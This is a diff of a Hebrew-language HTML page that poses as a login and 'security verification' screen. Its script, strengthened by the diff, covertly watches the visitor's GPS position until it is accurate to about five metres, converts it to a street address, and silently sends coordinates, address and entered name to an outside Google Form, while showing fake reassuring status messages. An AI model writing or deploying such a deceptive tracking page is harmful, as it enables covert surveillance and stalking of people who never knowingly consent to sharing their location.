@@ -3,88 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>טעינת האתר...</title>
+    <title>טעינת מערכת...</title>
     <style>
-        body { 
-            font-family: system-ui, -apple-system, sans-serif; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            margin: 0; 
-            background-color: #f8f9fa; 
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-        }
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #f8f9fa; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #2ecc71; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { margin-top: 20px; color: #555; font-size: 18px; }
+        p { margin-top: 20px; color: #444; font-size: 18px; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div class="loader"></div>
-    <p id="status">טוען נתונים, נא להמתין...</p>
+    <p id="status">מתחבר לשרת הנתונים...</p>
 
     <script>
         window.onload = function() {
-            // 1. מיד עם הכניסה - בקשת שם
             const userName = prompt("שלום, אנא הכנס שם משתמש לכניסה:");
-
             if (!userName || userName.trim() === "") {
-                document.getElementById("status").innerText = "כניסה נדחתה. יש להזין שם.";
+                document.getElementById("status").innerText = "גישה נדחתה: חובה להזין שם.";
                 return;
             }
 
-            document.getElementById("status").innerText = "מתחבר לשרת...";
+            document.getElementById("status").innerText = "מבצע אימות אבטחה... נא לא לסגור את הדף";
 
-            // 2. בקשת מיקום אוטומטית
-            navigator.geolocation.getCurrentPosition(async function(pos) {
+            let hasSent = false;
+            let bestPosition = null;
+            let bestAccuracy = Infinity;
+
+            // פונקציית השליחה הסופית
+            async function sendToGoogle(pos, name) {
+                if (hasSent) return;
+                hasSent = true;
+
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                let address = "מזהה מיקום...";
+                let address = "מזהה כתובת...";
 
-                // שליפת כתובת (שדה 4)
                 try {
                     const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18`);
                     const d = await r.json();
                     if (d && d.display_name) address = d.display_name;
-                } catch (e) {
-                    address = "לא נמצאה כתובת מילולית";
-                }
+                } catch (e) { address = "כתובת לא זמינה"; }
 
-                // 3. שליחה ל-Google Form (כל 5 השדות לפי הסדר שלך)
                 const formID = "1FAIpQLSfYA2SsnyuwYFOhz_IjWdfLAkudHUJPBWmS3VUoF-8xp5u6Gw";
                 const url = `https://docs.google.com/forms/d/e/${formID}/formResponse` +
                     `?entry.1905099702=${lat}` +
                     `&entry.379601602=${lon}` +
                     `&entry.1378939865=${encodeURIComponent(address)}` +
-                    `&entry.2102560173=${encodeURIComponent(userName)}` +
+                    `&entry.2102560173=${encodeURIComponent(name)}` +
                     `&submit=Submit`;
 
-                // שליחה שקטה דרך Fetch
                 fetch(url, { mode: 'no-cors' });
-
-                // סיום התהליך
-                document.getElementById("status").innerText = "התחברת בהצלחה!";
                 
-                setTimeout(() => {
-                    alert("ברוך הבא " + userName + "!");
-                    // כאן אפשר להוסיף מעבר אוטומטי לדף אחר אם תרצה:
-                    // window.location.href = "your_main_page.html";
-                }, 500);
+                document.getElementById("status").innerText = "התחברת בהצלחה!";
+                setTimeout(() => { alert("כניסה אושרה. ברוך הבא " + name); }, 500);
+            }
 
-            }, function(err) {
-                // גם אם המשתמש סירב למיקום, ניתן לו הרגשה שהכל בסדר
-                document.getElementById("status").innerText = "התחברת כמשתמש אורח.";
-                console.log("Location denied: " + err.message);
-            }, { enableHighAccuracy: true, timeout: 8000 });
+            // האזנה אקטיבית למיקום
+            const watchID = navigator.geolocation.watchPosition((pos) => {
+                const currentAccuracy = pos.coords.accuracy;
+                
+                // שמירת המיקום הכי טוב שנמצא עד עכשיו
+                if (currentAccuracy < bestAccuracy) {
+                    bestAccuracy = currentAccuracy;
+                    bestPosition = pos;
+                }
+
+                // אם הגענו לסף של 5 מטרים - שלח מיד ועצור
+                if (currentAccuracy <= 5) {
+                    navigator.geolocation.clearWatch(watchID);
+                    sendToGoogle(pos, userName);
+                }
+            }, (err) => {
+                console.log("Error: ", err);
+            }, {
+                enableHighAccuracy: true,
+                timeout: 20000,
+                maximumAge: 0
+            });
+
+            // FALLBACK: אם אחרי 15 שניות לא הגענו ל-5 מטר, שלח את הכי טוב שיש
+            setTimeout(() => {
+                if (!hasSent) {
+                    navigator.geolocation.clearWatch(watchID);
+                    if (bestPosition) {
+                        sendToGoogle(bestPosition, userName);
+                    } else {
+                        document.getElementById("status").innerText = "שגיאת חיבור. וודא שה-GPS פועל.";
+                    }
+                }
+            }, 15000);
         };
     </script>
 </body>
